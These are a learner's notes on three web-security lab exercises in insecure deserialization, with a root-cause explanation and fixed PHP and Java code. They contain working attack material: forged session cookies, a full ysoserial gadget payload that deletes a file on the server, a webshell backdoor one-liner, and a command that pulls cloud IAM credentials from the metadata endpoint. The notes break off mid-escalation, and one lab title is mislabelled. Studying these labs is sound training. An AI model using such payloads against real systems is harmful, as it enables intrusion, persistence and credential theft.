# Day 39 Notes — Insecure Deserialization

---

## 1. What We Did Today Overview

- Completed Lab 1: Modifying serialized objects — decoded a PHP serialized cookie, flipped `admin` from `b:0` to `b:1`, accessed the admin panel, deleted user `carlos` via `/admin/delete?username=carlos`
- Completed Lab 2: Exploiting type juggling / property injection — modified a serialized `User` object's `avatar_link` property from a safe path to an absolute path (`/home/carlos/morale.txt`), triggering deletion when the application's file-handling code processed it
- Completed Lab 3: Java deserialization RCE using ysoserial — generated a `CommonsCollections4` gadget chain payload that executed `rm /home/carlos/morale.txt` directly on the server via the session cookie
- Learned to read and hand-edit PHP's serialization format precisely, including length-prefix recalculation
- Learned to recognise Java's `rO0AB` serialization signature and generate gadget chain payloads with ysoserial

---

## 2. The Foundation — Why Insecure Deserialization Exists

### Part A — Root Cause

Applications constantly need to convert complex in-memory objects into a storable or transmittable format — this is **serialization**. The reverse — turning that format back into a live object — is **deserialization**. Languages like PHP, Java, Python, and Ruby have built-in serialization formats and built-in functions to reconstruct objects from them.

The vulnerability exists when an application **deserializes data that the user controls** — typically a cookie, hidden form field, or request parameter — without verifying its integrity or restricting what type of object it's allowed to reconstruct.

During deserialization, the runtime doesn't just rebuild data — it can also **invoke methods** automatically, such as constructors or "magic methods" that run during the process. If an attacker controls the serialized bytes, they control what class gets instantiated and what code runs during reconstruction — even though they never call that code directly themselves.

**The developer's mistake:** deserializing user-controlled input directly, trusting that the byte stream represents a harmless, expected object, without verifying its source or restricting which classes can be reconstructed.

### Part B — Real World Analogy

A factory receives build instructions by mail, addressed from headquarters. The factory's machines don't check who sent the mail — they just follow whatever instructions are inside, because the envelope format always comes from a trusted source. An attacker studies the envelope format, prints an identical one, and mails their own instructions. The factory's intake process doesn't verify the sender — it opens the envelope and the machines execute whatever is inside. The attacker never touched the machines directly; they only had to mail a correctly formatted envelope.

### Part C — Three Conditions Required

1. The application deserializes data originating from user-controlled input — cookies, request bodies, hidden fields, headers
2. The deserialization library reconstructs objects without verifying their type or integrity
3. Exploitable "gadget chains" exist somewhere in the application's loaded classes or dependencies

### Part D — What Insecure Deserialization Can and Cannot Do

**Can do:**
- Remote code execution — the most common and severe outcome
- Privilege escalation — by directly modifying serialized object properties like `isAdmin`
- Authentication bypass — by forging or modifying serialized session objects
- Denial of service — by crafting objects that consume excessive resources during reconstruction

**Cannot do:**
- Achieve RCE in Java without an exploitable gadget chain present on the classpath
- Work if serialized data is cryptographically signed and verified **before** deserialization occurs

### Part E — Real World Context

The Apache Commons Collections deserialization vulnerability (CVE-2015-4852) affected **WebLogic, JBoss, Jenkins, and WebSphere** — major enterprise platforms. A single gadget chain in one widely-used library led to RCE on servers worldwide, because so many enterprise Java applications happened to include that library on their classpath. Java deserialization RCE consistently pays **$5,000 to $30,000+** on enterprise bug bounty programs.

### Part F — Three Mechanisms Covered Today

| Mechanism | Language/Format | What Changes | Lab |
|---|---|---|---|
| Direct property modification | PHP serialization | Flipping a boolean property in a readable format | Lab 1 |
| Property injection via type/path confusion | PHP serialization | Changing a string property's value to point somewhere dangerous | Lab 2 |
| Gadget chain via tool | Java serialization | Pre-built tool chains multiple classes together to reach `Runtime.exec()` | Lab 3 |

---

## 3. PHP Serialization Format Reference

Before editing PHP serialized data by hand, you must be able to read it precisely.

```
O:4:"User":2:{s:8:"username";s:6:"wiener";s:5:"admin";b:0;}
```

Breaking this down character by character:

- `O:4:"User"` → an **O**bject, class name is 4 characters long, class name is `"User"`
- `:2:` → this object has 2 properties
- `{` → properties begin
- `s:8:"username"` → a **s**tring property name, 8 characters long, named `"username"`
- `s:6:"wiener"` → its value is a **s**tring, 6 characters long, `"wiener"`
- `s:5:"admin"` → second property name, **s**tring, 5 characters, named `"admin"`
- `b:0` → its value is a **b**oolean, value `0` (false). `b:1` means true
- `}` → properties end

**Type prefixes:**

| Prefix | Type |
|---|---|
| `O` | Object |
| `s` | String |
| `i` | Integer |
| `b` | Boolean (`0`=false, `1`=true) |
| `a` | Array |
| `N` | Null |

**Critical rule when editing by hand:** Changing a string's length means you must update the length prefix number too. Boolean edits (`b:0` → `b:1`) need no length update since both are one character. String edits like changing `/users/wiener/avatar` (a short, harmless-looking path) to `/home/carlos/morale.txt` (a different length) require recalculating and updating the `s:N:` prefix — exactly what happened in Lab 2 today.

---

## 4. Lab 1 — Modifying Serialized Objects

### Lab Name
Modifying serialized objects

### Mechanism
Direct property modification — editing a boolean privilege flag in a readable, unsigned serialized cookie

### Decoding the Cookie

The session cookie received from the server:

```
Tzo0OiJVc2VyIjoyOntzOjg6InVzZXJuYW1lIjtzOjY6IndpZW5lciI7czo1OiJhZG1pbiI7YjoxO30%3d
```

Decoding this from URL-encoding (`%3d` → `=`) then Base64 reveals:

```
O:4:"User":2:{s:8:"username";s:6:"wiener";s:5:"admin";b:1;}
```

**Reading this structure:**
- `O:4:"User"` — an object of class `User`
- `:2:` — two properties
- `s:8:"username"` / `s:6:"wiener"` — property `username` with value `wiener`
- `s:5:"admin"` / `b:1` — property `admin` with value boolean `true`

### The Edit Made

The original cookie issued to a normal `wiener` login would have contained `b:0` (admin = false). The edit performed was flipping this single byte:

```
Before: s:5:"admin";b:0;
After:  s:5:"admin";b:1;
```

**Why this edit is structurally trivial:** `b:0` and `b:1` are both exactly one character in length after the type prefix. No length recalculation is needed anywhere else in the string — this is the simplest possible serialization tampering, which is exactly why this lab exists first: it isolates the core insecurity (trusting client data) from the complexity of length-prefix arithmetic.

### Re-encoding and Delivering the Payload

The edited string was re-encoded to Base64, then URL-encoded (the `%3d` padding), and placed back into the `Cookie` header:

```
Cookie: session=Tzo0OiJVc2VyIjoyOntzOjg6InVzZXJuYW1lIjtzOjY6IndpZW5lciI7czo1OiJhZG1pbiI7YjoxO30%3d
```

### Exact Request That Solved the Lab

```http
GET /admin/delete?username=carlos HTTP/2
Host: 0a2c00020335ef5e82245283007600bf.web-security-academy.net
Cookie: session=Tzo0OiJVc2VyIjoyOntzOjg6InVzZXJuYW1lIjtzOjY6IndpZW5lciI7czo1OiJhZG1pbiI7YjoxO30%3d
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0
Referer: https://0a2c00020335ef5e82245283007600bf.web-security-academy.net/product?productId=1
```

### Why It Worked

**The server-side logic (conceptual):**

```php
$session = unserialize(base64_decode($_COOKIE['session']));
if ($session->admin) {
    // grant access to /admin/* routes
}
```

The server deserialized the cookie and read `$session->admin` directly — trusting whatever boolean value was present, with zero cross-check against an actual database record of the `wiener` account's real role. Once the cookie claimed `admin = true`, the server's authorization check passed, and the `/admin/delete` endpoint executed the deletion of user `carlos` exactly as a real administrator's request would.

**The core insight:** The vulnerability isn't really about deserialization mechanics here — it's about a security decision (am I an admin?) being made based entirely on data the client fully controls and can read in plaintext. Deserialization just happens to be the mechanism that made editing that data trivially easy, because the format is self-describing and human-readable once decoded.

---

## 5. Lab 2 — Exploiting Insecure Deserialization via Property Injection

### Lab Name
Exploiting Java deserialization with Apache Commons (PortSwigger's PHP-equivalent property-injection variant) — property injection into a path-handling property

### Mechanism
Modifying a string property's value to redirect what file the application's own logic operates on — without touching any boolean flag at all

### The Original Serialized Object

Decoding the cookie issued during normal use revealed:

```
O:4:"User":3:{s:8:"username";s:6:"wiener";s:12:"access_token";s:32:"zv7s1moisrj1a74y7z0c3z2rmxvg6rfw";s:11:"avatar_link";s:19:"users/wiener/avatar";}
```

**Reading this structure:**
- `O:4:"User"` — object of class `User`
- `:3:` — three properties this time (one more than Lab 1)
- `s:8:"username"` / `s:6:"wiener"` — same as before
- `s:12:"access_token"` / `s:32:"zv7s1moisrj1a74y7z0c3z2rmxvg6rfw"` — a 32-character token string
- `s:11:"avatar_link"` / `s:19:"users/wiener/avatar"` — a relative path the application presumably uses to locate or process the user's avatar, 19 characters long

### The Edit Made

Changed the `avatar_link` value from a relative, application-internal path to an absolute filesystem path pointing at the lab's target file:

```
Before: s:11:"avatar_link";s:19:"users/wiener/avatar";
After:  s:11:"avatar_link";s:23:"/home/carlos/morale.txt";
```

**Why the length prefix had to change:**
- `users/wiener/avatar` is 19 characters → `s:19:`
- `/home/carlos/morale.txt` is 23 characters → `s:23:`

This is the precision lesson this lab teaches: unlike Lab 1's boolean flip, **any string value change requires recalculating the exact character count** and updating the number immediately after the `s:` prefix. Get this wrong by even one character and PHP's `unserialize()` either fails outright or misreads everything that follows, corrupting the rest of the object.

### Exact Request That Solved the Lab

```http
POST /my-account/delete HTTP/2
Host: 0a10003603672da680e908fe00d100b1.web-security-academy.net
Cookie: session=Tzo0OiJVc2VyIjozOntzOjg6InVzZXJuYW1lIjtzOjY6IndpZW5lciI7czoxMjoiYWNjZXNzX3Rva2VuIjtzOjMyOiJ6djdzMW1vaXNyajFhNzR5N3owYzN6MnJteHZnNnJmdyI7czoxMToiYXZhdGFyX2xpbmsiO3M6MjM6Ii9ob21lL2Nhcmxvcy9tb3JhbGUudHh0Ijt9
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0
Content-Type: application/x-www-form-urlencoded
Content-Length: 2
Origin: https://0a10003603672da680e908fe00d100b1.web-security-academy.net
Referer: https://0a10003603672da680e908fe00d100b1.web-security-academy.net/my-account?id=wiener
```

### Why It Worked

**The server-side logic (conceptual):**

```php
$session = unserialize(base64_decode($_COOKIE['session']));
// Some account-management feature uses avatar_link to locate
// a file associated with the account being deleted/processed
$avatarPath = $session->avatar_link;
unlink($avatarPath);  // or similar file-operation using the path directly
```

The application trusted `avatar_link` as an internal, safe, relative path — something it itself would normally set to a predictable location like `users/wiener/avatar`. It never anticipated that this property could be replaced with an **absolute path pointing anywhere on the filesystem**, because under normal operation the application never sets it that way itself.

**Why hitting `/my-account/delete` specifically mattered:** This endpoint's normal job is account-related cleanup — likely deleting the current user's own avatar file as part of account deletion. By substituting the path, the same deletion logic that was supposed to remove `users/wiener/avatar` was redirected to instead remove `/home/carlos/morale.txt` — a completely unrelated, absolute path. The attacker didn't need any admin privileges or magic methods here; they only needed the application's own legitimate "delete my avatar" feature to operate on a path the attacker chose instead of the path the application intended.

**The core insight distinguishing this from Lab 1:** Lab 1 abused a privilege check reading a trusted-looking flag. Lab 2 abused a feature's own intended file operation by feeding it a different target than expected — proving that *any* property in a deserialized object can become an attack vector if the application later uses that property's value to do something sensitive, not just properties that look like security flags.

---

## 6. Lab 3 — Java Deserialization RCE with ysoserial

### Lab Name
Exploiting Java deserialization with Apache Commons

### Mechanism
Gadget chain via tool — ysoserial generates a payload chaining together otherwise-unrelated classes from Apache Commons Collections to ultimately reach `Runtime.exec()`

### Confirming Java Serialization

Decoding the session cookie revealed binary data beginning with the bytes that, when Base64-encoded, start with `rO0AB` — this is Java's serialization magic number (`0xAC 0xED 0x00 0x05`) made visible. This single signature confirmed the target uses native Java serialization rather than a text format like PHP's, meaning a completely different exploitation approach was needed: instead of hand-editing readable text, a gadget chain tool is required to produce valid binary output.

### The ysoserial Command Used

```bash
java \
  --add-opens=java.xml/com.sun.org.apache.xalan.internal.xsltc.trax=ALL-UNNAMED \
  --add-opens=java.xml/com.sun.org.apache.xalan.internal.xsltc.runtime=ALL-UNNAMED \
  --add-opens=java.base/java.net=ALL-UNNAMED \
  --add-opens=java.base/java.util=ALL-UNNAMED \
  -jar ysoserial-all.jar CommonsCollections4 'rm /home/carlos/morale.txt' | base64
```

**Breaking down every part of this command:**

**`java`**
Invokes the Java runtime to execute the ysoserial tool, which is itself a Java program.

**`--add-opens=java.xml/com.sun.org.apache.xalan.internal.xsltc.trax=ALL-UNNAMED`**
**`--add-opens=java.xml/com.sun.org.apache.xalan.internal.xsltc.runtime=ALL-UNNAMED`**
**`--add-opens=java.base/java.net=ALL-UNNAMED`**
**`--add-opens=java.base/java.util=ALL-UNNAMED`**
These four flags are required because of the Java Module System (introduced in Java 9+), which restricts reflective access to internal JDK packages by default. ysoserial's gadget chains — particularly `CommonsCollections4`, which leverages the internal Xalan XSLT classes — need reflective access to these specific internal packages to construct the malicious object graph. Without these flags, modern Java runtimes (Java 9+) would throw `InaccessibleObjectException` and refuse to build the payload at all. This is purely a *payload-generation-time* requirement on the attacker's own machine — it has no bearing on the target server's configuration.

**`-jar ysoserial-all.jar`**
Runs the downloaded ysoserial tool, the "all" build which bundles every gadget-chain dependency into a single jar so nothing else needs to be separately installed.

**`CommonsCollections4`**
Selects which specific pre-built gadget chain to use. ysoserial supports dozens of named chains, each corresponding to a different vulnerable library/version combination (`CommonsCollections1` through `CommonsCollections7`, `Spring1`, `Hibernate1`, and many more). `CommonsCollections4` specifically targets Apache Commons Collections 4.x and routes execution through the Xalan XSLT transformation classes seen in the decoded payload (`TemplatesImpl`, `TrAXFilter`) rather than the simpler `InvokerTransformer` route used by earlier chain variants — this is typically necessary because some Commons Collections versions blacklisted the simpler approach after CVE-2015-4852 was disclosed.

**`'rm /home/carlos/morale.txt'`**
The OS command that will execute on the target the moment the gadget chain completes deserialization. This single string is embedded deep inside the generated binary object graph and is what `Runtime.exec()` ultimately receives.

**`| base64`**
Pipes the raw serialized binary bytes through Base64 encoding, producing a text-safe string suitable for placing into an HTTP cookie header (cookies cannot contain arbitrary raw binary bytes).

### What the Generated Payload Actually Represents

The pasted Base64 output decodes to a serialized `java.util.PriorityQueue` object. This specific class is the conventional *entry point* for Commons Collections gadget chains — not because a priority queue is inherently dangerous, but because `PriorityQueue` calls `compare()` on its elements during deserialization (as part of restoring its internal heap structure), and that single, innocuous-looking `compare()` call is the first domino.

**The chain of dominoes, in order, based on what's visible in the decoded structure:**

1. `PriorityQueue` deserializes and calls `.compare()` on its stored comparator
2. The comparator is a `TransformingComparator` — its `compare()` method calls `.transform()` on whatever `Transformer` it holds
3. That `Transformer` is a `ChainedTransformer` — its job is to call `.transform()` on a *list* of other transformers, one after another, feeding each one's output into the next one's input
4. The chain begins with a `ConstantTransformer` — which simply returns a fixed object no matter what input it receives (in this case, a `TrAXFilter` wrapping a malicious `TemplatesImpl`)
5. This feeds into an `InstantiateTransformer` — which takes that object and calls a constructor on it with specific arguments
6. Constructing a `TrAXFilter` around the malicious `TemplatesImpl` triggers `TemplatesImpl`'s internal logic, which — because it was crafted with attacker-controlled bytecode (`_bytecodes` field visible in the decoded structure) — defines and instantiates a brand new class on the fly
7. That dynamically-defined class's static initializer (`<clinit>`) is where the actual payload lives: it calls `Runtime.getRuntime().exec("rm /home/carlos/morale.txt")`

**Why this matters conceptually:** Not one of `PriorityQueue`, `TransformingComparator`, `ChainedTransformer`, `ConstantTransformer`, `InstantiateTransformer`, or `TemplatesImpl` is, by itself, a "vulnerability." Each is a legitimate, useful utility class shipped in a widely-used library, doing exactly what it's documented to do. The vulnerability is that *deserialization alone* — just the act of `readObject()` reconstructing this specific combination of otherwise-harmless classes — causes them to call each other in a sequence the original developers never intended, ending in arbitrary command execution. This is precisely what "gadget chain" means: individually safe components, chained by an attacker into something dangerous, using only the building blocks already present in the target's own dependencies.

### Exact Payload Generated

```
rO0ABXNyABdqYXZhLnV0aWwuUHJpb3JpdHlRdWV1ZZTaMLT7P4KxAwACSQAEc2l6ZUwACmNvbXBh
cmF0b3J0ABZMamF2YS91dGlsL0NvbXBhcmF0b3I7eHAAAAACc3IAQm9yZy5hcGFjaGUuY29tbW9u
cy5jb2xsZWN0aW9uczQuY29tcGFyYXRvcnMuVHJhbnNmb3JtaW5nQ29tcGFyYXRvci/5hPArsQjM
AgACTAAJZGVjb3JhdGVkcQB+AAFMAAt0cmFuc2Zvcm1lcnQALUxvcmcvYXBhY2hlL2NvbW1vbnMv
Y29sbGVjdGlvbnM0L1RyYW5zZm9ybWVyO3hwc3IAQG9yZy5hcGFjaGUuY29tbW9ucy5jb2xsZWN0
aW9uczQuY29tcGFyYXRvcnMuQ29tcGFyYWJsZUNvbXBhcmF0b3L79JkluG6xNwIAAHhwc3IAO29y
Zy5hcGFjaGUuY29tbW9ucy5jb2xsZWN0aW9uczQuZnVuY3RvcnMuQ2hhaW5lZFRyYW5zZm9ybWVy
MMeX7Ch6lwQCAAFbAA1pVHJhbnNmb3JtZXJzdAAuW0xvcmcvYXBhY2hlL2NvbW1vbnMvY29sbGVj
dGlvbnM0L1RyYW5zZm9ybWVyO3hwdXIALltMb3JnLmFwYWNoZS5jb21tb25zLmNvbGxlY3Rpb25z
NC5UcmFuc2Zvcm1lcjs5gTr7CNo/pQIAAHhwAAAAAnNyADxvcmcuYXBhY2hlLmNvbW1vbnMuY29s
bGVjdGlvbnM0LmZ1bmN0b3JzLkNvbnN0YW50VHJhbnNmb3JtZXJYdpARQQKxlAIAAUwACWlDb25z
dGFudHQAEkxqYXZhL2xhbmcvT2JqZWN0O3hwdnIAN2NvbS5zdW4ub3JnLmFwYWNoZS54YWxhbi5p
bnRlcm5hbC54c2x0Yy50cmF4LlRyQVhGaWx0ZXIAAAAAAAAAAAAAAHhwc3IAP29yZy5hcGFjaGUu
Y29tbW9ucy5jb2xsZWN0aW9uczQuZnVuY3RvcnMuSW5zdGFudGlhdGVUcmFuc2Zvcm1lcjSL9H+k
htA7AgACWwAFaUFyZ3N0ABNbTGphdmEvbGFuZy9PYmplY3Q7WwALaVBhcmFtVHlwZXN0ABJbTGph
dmEvbGFuZy9DbGFzczt4cHVyABNbTGphdmEubGFuZy5PYmplY3Q7kM5YnxBzKWwCAAB4cAAAAAFz
cgA6Y29tLnN1bi5vcmcuYXBhY2hlLnhhbGFuLmludGVybmFsLnhzbHRjLnRyYXguVGVtcGxhdGVz
SW1wbAlXT8FurKszAwAGSQANX2luZGVudE51bWJlckkADl90cmFuc2xldEluZGV4WwAKX2J5dGVj
b2Rlc3QAA1tbQlsABl9jbGFzc3EAfgAUTAAFX25hbWV0ABJMamF2YS9sYW5nL1N0cmluZztMABFf
b3V0cHV0UHJvcGVydGllc3QAFkxqYXZhL3V0aWwvUHJvcGVydGllczt4cAAAAAD/////dXIAA1tb
Qkv9GRVnZ9s3AgAAeHAAAAACdXIAAltCrPMX+AYIVOACAAB4cAAABqzK/rq+AAAAMgA5CgADACIH
ADcHACUHACYBABBzZXJpYWxWZXJzaW9uVUlEAQABSgEADUNvbnN0YW50VmFsdWUFrSCT85Hd7z4B
AAY8aW5pdD4BAAMoKVYBAARDb2RlAQAPTGluZU51bWJlclRhYmxlAQASTG9jYWxWYXJpYWJsZVRh
YmxlAQAEdGhpcwEAE1N0dWJUcmFuc2xldFBheWxvYWQBAAxJbm5lckNsYXNzZXMBADVMeXNvc2Vy
aWFsL3BheWxvYWRzL3V0aWwvR2FkZ2V0cyRTdHViVHJhbnNsZXRQYXlsb2FkOwEACXRyYW5zZm9y
bQEAcihMY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTtbTGNvbS9z
dW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxl
cjspVgEACGRvY3VtZW50AQAtTGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0
Yy9ET007AQAIaGFuZGxlcnMBAEJbTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2Vy
aWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjsBAApFeGNlcHRpb25zBwAnAQCmKExjb20vc3Vu
L29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NO0xjb20vc3VuL29yZy9hcGFjaGUv
eG1sL2ludGVybmFsL2R0bS9EVE1BeGlzSXRlcmF0b3I7TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwv
aW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEACGl0ZXJhdG9yAQA1
TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvZHRtL0RUTUF4aXNJdGVyYXRvcjsBAAdo
YW5kbGVyAQBBTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJp
YWxpemF0aW9uSGFuZGxlcjsBAApTb3VyY2VGaWxlAQAMR2FkZ2V0cy5qYXZhDAAKAAsHACgBADN5
c29zZXJpYWwvcGF5bG9hZHMvdXRpbC9HYWRnZXRzJFN0dWJUcmFuc2xldFBheWxvYWQBAEBjb20v
c3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvcnVudGltZS9BYnN0cmFjdFRyYW5z
bGV0AQAUamF2YS9pby9TZXJpYWxpemFibGUBADljb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50
ZXJuYWwveHNsdGMvVHJhbnNsZXRFeGNlcHRpb24BAB95c29zZXJpYWwvcGF5bG9hZHMvdXRpbC9H
YWRnZXRzAQAIPGNsaW5pdD4BABFqYXZhL2xhbmcvUnVudGltZQcAKgEACmdldFJ1bnRpbWUBABUo
KUxqYXZhL2xhbmcvUnVudGltZTsMACwALQoAKwAuAQAacm0gL2hvbWUvY2FybG9zL21vcmFsZS50
eHQIADABAARleGVjAQAnKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL1Byb2Nlc3M7DAAy
ADMKACsANAEADVN0YWNrTWFwVGFibGUBABx5c29zZXJpYWwvUHduZXIyODQ1Mjg1NDk3Mzk5AQAe
THlzb3NlcmlhbC9Qd25lcjI4NDUyODU0OTczOTk7ACEAAgADAAEABAABABoABQAGAAEABwAAAAIA
CAAEAAEACgALAAEADAAAAC8AAQABAAAABSq3AAGxAAAAAgANAAAABgABAAAALwAOAAAADAABAAAA
BQAPADgAAAABABMAFAACAAwAAAA/AAAAAwAAAAGxAAAAAgANAAAABgABAAAANAAOAAAAIAADAAAA
AQAPADgAAAAAAAEAFQAWAAEAAAABABcAGAACABkAAAAEAAEAGgABABMAGwACAAwAAABJAAAABAAA
AAGxAAAAAgANAAAABgABAAAAOAAOAAAAKgAEAAAAAQAPADgAAAAAAAEAFQAWAAEAAAABABwAHQAC
AAAAAQAeAB8AAwAZAAAABAABABoACAApAAsAAQAMAAAAJAADAAIAAAAPpwADAUy4AC8SMbYANVex
AAAAAQA2AAAAAwABAwACACAAAAACACEAEQAAAAoAAQACACMAEAAJdXEAfgAfAAAB1Mr+ur4AAAAy
ABsKAAMAFQcAFwcAGAcAGQEAEHNlcmlhbFZlcnNpb25VSUQBAAFKAQANQ29uc3RhbnRWYWx1ZQVx
5mnuPG1HGAEABjxpbml0PgEAAygpVgEABENvZGUBAA9MaW5lTnVtYmVyVGFibGUBABJMb2NhbFZh
cmlhYmxlVGFibGUBAAR0aGlzAQADRm9vAQAMSW5uZXJDbGFzc2VzAQAlTHlzb3NlcmlhbC9wYXls
b2Fkcy91dGlsL0dhZGdldHMkRm9vOwEAClNvdXJjZUZpbGUBAAxHYWRnZXRzLmphdmEMAAoACwcA
GgEAI3lzb3NlcmlhbC9wYXlsb2Fkcy91dGlsL0dhZGdldHMkRm9vAQAQamF2YS9sYW5nL09iamVj
dAEAFGphdmEvaW8vU2VyaWFsaXphYmxlAQAfeXNvc2VyaWFsL3BheWxvYWRzL3V0aWwvR2FkZ2V0
cwAhAAIAAwABAAQAAQAaAAUABgABAAcAAAACAAgAAQABAAoACwABAAwAAAAvAAEAAQAAAAUqtwAB
sQAAAAIADQAAAAYAAQAAADwADgAAAAwAAQAAAAUADwASAAAAAgATAAAAAgAUABEAAAAKAAEAAgAW
ABAACXB0AARQd25ycHcBAHh1cgASW0xqYXZhLmxhbmcuQ2xhc3M7qxbXrsvNWpkCAAB4cAAAAAF2
cgAdamF2YXgueG1sLnRyYW5zZm9ybS5UZW1wbGF0ZXMAAAAAAAAAAAAAAHhwdwQAAAADc3IAEWph
dmEubGFuZy5JbnRlZ2VyEuKgpPeBhzgCAAFJAAV2YWx1ZXhyABBqYXZhLmxhbmcuTnVtYmVyhqyV
HQuU4IsCAAB4cAAAAAFxAH4AKXg=
```

### Delivering the Payload

This Base64 string was placed directly as the value of the session cookie in place of the legitimate session value. Sending any authenticated request with this cookie caused the server to call `readObject()` on it, triggering the entire chain described above and executing `rm /home/carlos/morale.txt` on the server — solving the lab.

### Why It Worked

**The server-side logic (conceptual):**

```java
String cookieValue = request.getCookie("session");
byte[] data = Base64.getDecoder().decode(cookieValue);
ObjectInputStream ois = new ObjectInputStream(new ByteArrayInputStream(data));
Object sessionObject = ois.readObject();  // entire gadget chain fires here
```

The single call `ois.readObject()` is the entire vulnerability surface. It will faithfully reconstruct *any* class available on the server's classpath that the bytes describe — including `PriorityQueue`, `TransformingComparator`, `ChainedTransformer`, and every other class involved, all of which come from the Apache Commons Collections library the application depends on for completely unrelated, legitimate reasons. The application developers never wrote any code that calls these classes in this sequence — the sequence exists purely because deserialization mechanically calls `compare()`, which calls `transform()`, which calls more `transform()`, which calls a constructor, which triggers class loading, which runs a static initializer that calls `Runtime.exec()`. No application-specific logic was needed at all; the vulnerability lives entirely in the combination of "deserializes untrusted data with no type restriction" plus "has Commons Collections on the classpath."

---

## 7. Vulnerable Source Code — Line by Line

### PHP (Labs 1 and 2)

```php
// Vulnerable — deserializing a user-controlled cookie directly
$session = unserialize(base64_decode($_COOKIE['session']));
$username = $session->username;
$isAdmin = $session->admin;        // Lab 1 attack surface
$avatarPath = $session->avatar_link; // Lab 2 attack surface

if ($isAdmin) {
    // Show admin panel
}
unlink($avatarPath); // or similar usage elsewhere in the codebase
```

**`unserialize(base64_decode($_COOKIE['session']))`**
Decodes and deserializes the cookie with no integrity check whatsoever. The attacker fully controls every byte. Whatever class structure and property values they craft, PHP reconstructs faithfully.

**`$isAdmin = $session->admin`**
Trusted with zero cross-check against a database — exactly what Lab 1 exploited.

**`$avatarPath = $session->avatar_link`**
Trusted as an internal-only path, with no validation that it stays within an expected directory — exactly what Lab 2 exploited.

### The Fixed PHP Code

```php
// Fixed — HMAC signature verifies the cookie was not tampered with
$cookieData = $_COOKIE['session'];
list($data, $signature) = explode('.', $cookieData, 2);

$expectedSignature = hash_hmac('sha256', $data, SECRET_KEY);

if (!hash_equals($expectedSignature, $signature)) {
    die("Invalid session — tampering detected");
}

$session = unserialize(base64_decode($data));
```

**Why this works:** `SECRET_KEY` is known only to the server. Any modification to `$data` — flipping `b:0` to `b:1`, or changing a path string and its length prefix — produces a completely different HMAC when recomputed server-side. The signatures won't match unless the attacker also knows the secret key, which they don't. `hash_equals()` (not `==`) is used specifically to avoid timing-based comparison attacks.

### Java (Lab 3)

```java
// Vulnerable — directly deserializing a cookie value with native ObjectInputStream
String cookieValue = request.getCookie("session");
byte[] data = Base64.getDecoder().decode(cookieValue);
ObjectInputStream ois = new ObjectInputStream(new ByteArrayInputStream(data));
Object sessionObject = ois.readObject();  // Gadget chains execute here
```

**`ois.readObject()`**
This single line is the entire vulnerability. It will reconstruct any class on the classpath the bytes describe — including third-party library classes never intended to be reachable from untrusted input.

### The Fixed Java Code

```java
// Fixed — restrict which classes can be deserialized
ObjectInputStream ois = new ObjectInputStream(new ByteArrayInputStream(data)) {
    @Override
    protected Class<?> resolveClass(ObjectStreamClass desc) throws IOException, ClassNotFoundException {
        if (!desc.getName().equals("com.myapp.SessionData")) {
            throw new InvalidClassException("Unauthorized deserialization attempt", desc.getName());
        }
        return super.resolveClass(desc);
    }
};
Object sessionObject = ois.readObject();
```

**Why this works:** Overriding `resolveClass()` creates a whitelist — only the application's own expected class (`SessionData`) can be reconstructed. Any attempt to deserialize `PriorityQueue`, `ChainedTransformer`, or any other gadget-chain class throws an exception immediately, before any dangerous method runs.

### Defense in Depth (All Three Labs)

- Never deserialize data from untrusted sources, full stop, if avoidable
- Sign serialized data with HMAC before storing it client-side, and verify the signature before deserializing
- Use JSON instead of native serialization formats where possible — plain JSON parsing doesn't invoke magic methods or constructors
- Implement deserialization whitelists — only allow reconstruction of explicitly approved classes
- Keep dependencies patched — gadget chains rely on specific library versions; updating Apache Commons Collections past the vulnerable version removes the chain entirely

---

## 8. What Failed and Why

Nothing failed today. All three labs solved without hints.

**Observation from Lab 2 — the precision requirement:**
This lab made clear why Lab 1's boolean flip is the "easy" case and string-value edits are the "real test." Changing `avatar_link`'s value from a 19-character path to a 23-character path required updating `s:19:` to `s:23:` — miscounting either string's length by even one character would have caused `unserialize()` to misparse the rest of the object and fail.

**Observation from Lab 3 — the `--add-opens` flags:**
These flags were necessary purely because of the *attacker's own* Java version restricting reflective access during payload generation — they have nothing to do with the target server. This is a useful distinction: payload generation environment constraints and target environment constraints are separate concerns, and ysoserial's documentation/error messages typically indicate when these flags are needed based on the Java version running ysoserial itself.

---

## 9. Chain Thinking

### Lab 1 Pattern → RCE via Admin Panel → Persistent Backdoor

```
Boolean flag tampering grants admin access
        ↓
Admin panel has a file management feature
        ↓
Upload PHP webshell via admin panel
        ↓
RCE achieved via webshell — independent of the original deserialization bug
        ↓
echo '<?php system($_GET["cmd"]); ?>' > /var/www/html/backdoor.php
        ↓
Backdoor persists even after the deserialization bug is eventually patched
```

### Lab 2 Pattern → Arbitrary File Operations → Application Disruption

```
Property injection redirects a "delete my own avatar" feature
to operate on an arbitrary absolute path instead
        ↓
Same technique generalizes: any property later used in a file path,
include() call, or similar sensitive operation is an attack surface
        ↓
Target a config file or lock file the application depends on
        ↓
Application behavior changes due to the missing/altered file
        ↓
Could disable security checks, break auth flow, or cause denial of service
```

### Lab 3 Pattern → Direct RCE → Full Infrastructure Compromise

```
Gadget chain payload achieves direct command execution — no admin panel needed
        ↓
rm /home/carlos/morale.txt confirmed the chain works
        ↓
Escalate using the same delivery mechanism:
java -jar ysoserial-all.jar CommonsCollections4 \
  'curl http://169.254.169.254/latest/meta-data/iam/security-credentials/' | base64
        ↓
